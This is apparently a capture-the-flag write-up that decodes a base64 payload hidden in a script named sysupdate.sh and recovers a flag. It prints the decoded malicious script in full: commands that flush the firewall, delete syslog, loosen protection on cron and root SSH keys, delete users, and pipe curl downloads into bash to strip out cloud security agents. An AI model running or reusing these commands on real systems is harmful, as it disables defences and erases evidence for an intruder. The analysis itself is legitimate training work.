+++
title = "sysupdate - Writeup"
draft = false
ShowToc = false
author = ["connar"]
+++

In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:  
```sh
echo -n "IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=" | base64 -d | bash -s
```

We see the script decodes a b64 string and then runs it by piping it to bash.  
Let's follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:  
```sh
#!/bin/sh
ulimit -n 65535
sudo reboot
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
chattr -R -i /var/spool/cron
chattr -i /etc/crontab
ufw disable
iptables -F
echo "Q1RGTElCe200bDFjMTB1NV81eTU3M21fdXBkNDczNX0=" > /tmp/log_rot
sudo sysctl kernel.nmi_watchdog=0
echo '0' > /proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf
userdel key
userdel vfinder
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
if ps aux | grep -i '[a]liyun'; then
	curl hxxp://update.aegis.aliyun.com/download/uninstall.sh | bash
	curl hxxp://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash	
	pkill aliyun-service
	rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
	rm -rf /usr/local/aegis*
	systemctl stop aliyun.service
	systemctl disable aliyun.service
	service bcm-agent stop
	yum remove bcm-agent -y
	apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
	/usr/local/gcloud/stargate/admin/uninstall.sh
```

This script seems to be of malicious activity as it drops other scripts and runs it, stops services and modifies existing system files. In the code, we  also see another interesting base64 string echo-ed in the /tmp/log_rot file. Decoding it aswell gives us our flag: ```CTFLIB{m4l1c10u5_5y573m_upd4735}```